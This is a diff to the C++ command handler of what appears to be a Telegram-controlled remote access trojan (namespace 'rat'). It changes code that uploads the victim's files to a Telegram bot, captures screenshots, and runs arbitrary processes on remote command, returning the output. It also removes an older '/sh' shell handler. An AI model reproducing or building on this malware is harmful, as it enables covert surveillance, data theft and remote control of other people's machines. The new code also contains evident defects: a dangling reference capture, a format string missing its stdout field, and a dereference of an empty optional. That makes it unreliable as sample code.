@@ -12,7 +12,7 @@
 #include <string>
 #include <boost/algorithm/string.hpp>
 #include <memory>
-
+#include "rat/process.hpp"
 
 namespace rat::handler {
 constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB; 
@@ -41,20 +41,14 @@ void Handler::handleGetCommand() {
         this->bot->sendFile(file_path);
     } else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) {
         // medium file → async via thread pool
-        this->networking_pool->enqueue([this, file_path] {
-            try {
-                DEBUG_LOG("Async upload {}", file_path.string());
-                {
-                    std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
-                    auto resp = this->backing_bot->sendFile(file_path);
-                    if (resp != rat::tbot::BotResponse::SUCCESS) {
-                        ERROR_LOG("Failed to upload {}", file_path.string());
-                    }
-                }
-            } catch (const std::exception& ex) {
-                ERROR_LOG("Exception in async upload: {}", ex.what());
-                std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
-                this->backing_bot->sendMessage(fmt::format("Upload exception: {}", ex.what()));
+        this->process_pool->enqueue([this, &file_path] {
+            
+            DEBUG_LOG("Async upload {}", file_path.string());
+            std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
+            auto resp = this->backing_bot->sendFile(file_path);
+            
+            if (resp != rat::tbot::BotResponse::SUCCESS) {
+                ERROR_LOG("Failed to upload {}", file_path.string());
             }
         });
     } else {
@@ -67,9 +61,9 @@ void Handler::handleGetCommand() {
 
 void Handler::handleScreenshotCommand() {
     auto image_path = std::filesystem::path(
-        fmt::format("{}.{}", rat::system::getCurrentDateTime_Underscored(), this->state->screenshot_format)
+        fmt::format("{}.png", rat::system::getCurrentDateTime_Underscored())
         );
-    this->process_pool->enqueue([this, &image_path] {
+    this->process_pool->enqueue([this, image_path] {
         std::string output_buffer;
         bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
         
@@ -89,36 +83,18 @@ void Handler::handleScreenshotCommand() {
     this->bot->sendMessage("Screenshot command launched.");
 }
 
-void Handler::parseAndHandleShellCommand() {
-    std::string message_text = telegram_update.message.text;
-    message_text.erase(0, 4); // erase "/sh "
-    boost::trim(message_text);
-    
-    size_t space_char_pos = __findFirstOccurenceOfChar(message_text, ' ');
-    std::string timeout_string = message_text.substr(0, space_char_pos);
-    message_text.erase(0, space_char_pos);
-    boost::trim(message_text);
-    
-    int timeout = 0;
-    try {
-        timeout = std::stoi(timeout_string);
-    }
-    catch (const std::exception&) {
-        this->bot->sendMessage(fmt::format("Invalid timeout value: {}", timeout_string));
-        return;
-    }
-
-    std::future<std::string> result = rat::system::runShellCommand(message_text, static_cast<unsigned int>(timeout), this->timer_pool.get());
-    this->backing_bot->sendMessage(result.get());
-}
-
 void Handler::parseAndHandleProcessCommand() {
     std::string message_text = telegram_update.message.text;
+    if (message_text.size() <= 9) return;
     message_text.erase(0, 9); // remove "/process "
     boost::trim(message_text);
 
-    // Extract timeout
     size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
+    if (space_pos == std::string::npos) {
+        this->bot->sendMessage("Invalid command format");
+        return;
+    }
+
     std::string timeout_str = message_text.substr(0, space_pos);
     message_text.erase(0, space_pos);
     boost::trim(message_text);
@@ -126,52 +102,29 @@ void Handler::parseAndHandleProcessCommand() {
     int timeout = 0;
     try {
         timeout = std::stoi(timeout_str);
+        if (timeout < 0) throw std::invalid_argument("negative");
     } catch (...) {
         this->bot->sendMessage(fmt::format("Invalid timeout value: {}", timeout_str));
         return;
     }
-    auto fut = rat::system::runProcessAsync(message_text, timeout, this->timer_pool.get());
-    this->bot->sendMessage(fmt::format("Process '{}' launched successfully.", message_text));
 
-    this->process_pool->enqueue([this, fut = std::move(fut), cmd = message_text]() mutable {
-        std::unique_lock<std::mutex> backing_bot_lock(this->backing_bot_mutex);
-        try {
-            DEBUG_LOG("thread has being created + bot object copied {}", sizeof(tbot::Bot));
-            auto res = fut.get(); // wait for process to finish
-
-            std::string feedback;
-            if (res.exit_code == -1) {
-                feedback = fmt::format("Process '{}' killed (timeout exceeded).", cmd);
-            } else if (res.exit_code == -2) {
-                feedback = fmt::format("Process '{}' failed with exception:\n{}", cmd, res.stderr_str);
-            } else {
-                if(res.stderr_str.empty()) {
-                    feedback = fmt::format(
-                        "Process '{}' exited with code {}\n{}",
-                        cmd,
-                        res.exit_code,
-                        res.stdout_str
+    this->timer_pool->enqueue([this, message_text, timeout]() {
+        ::rat::process::runAsyncProcess(
+            message_text,
+            std::chrono::milliseconds(timeout),
+            [this](std::optional<::rat::process::ProcessResult> result) {
+                std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
+                if (result) {
+                    this->backing_bot->sendMessage(
+                        fmt::format("Exit: {}\nSTDOUT:\nSTDERR:{}", result->exitCode, result->stdoutStr, result->stderrStr)
                     );
-                }else{
-                    feedback = fmt::format(
-                        "Process '{}' exited with code {}\nSTDERR:\n{}",
-                        cmd,
-                        res.exit_code,
-                        res.stderr_str
-                    );
-
+                } else {
+                    this->backing_bot->sendMessage(fmt::format("Process timed out or failed\n STDERR:{}", result->stderrStr));
                 }
             }
-            DEBUG_LOG("[{}:{} {}] {}", __FILE__, __LINE__, __func__, feedback);
-            this->backing_bot->sendMessage(feedback);
-
-        } catch (const std::exception& ex) {
-            std::string err = fmt::format("Exception waiting for process {}", ex.what());
-            ERROR_LOG(err);
-            this->backing_bot->sendMessage(err);
-        }
+        );
     });
-
 }
+
 
 }//namespace rat::handler
